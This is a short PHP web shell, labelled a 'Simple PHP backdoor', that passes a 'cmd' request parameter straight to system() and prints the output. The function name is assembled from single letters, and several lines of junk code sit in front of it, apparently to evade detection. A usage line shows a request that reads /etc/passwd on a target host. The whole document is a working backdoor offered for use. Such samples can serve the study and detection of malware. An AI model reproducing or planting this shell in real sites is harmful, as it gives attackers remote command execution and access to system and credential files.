<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { /* noop */ }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { break; }

$__fn_14253 = "s"."y"."s"."t"."e"."m";

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        $__fn_14253($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
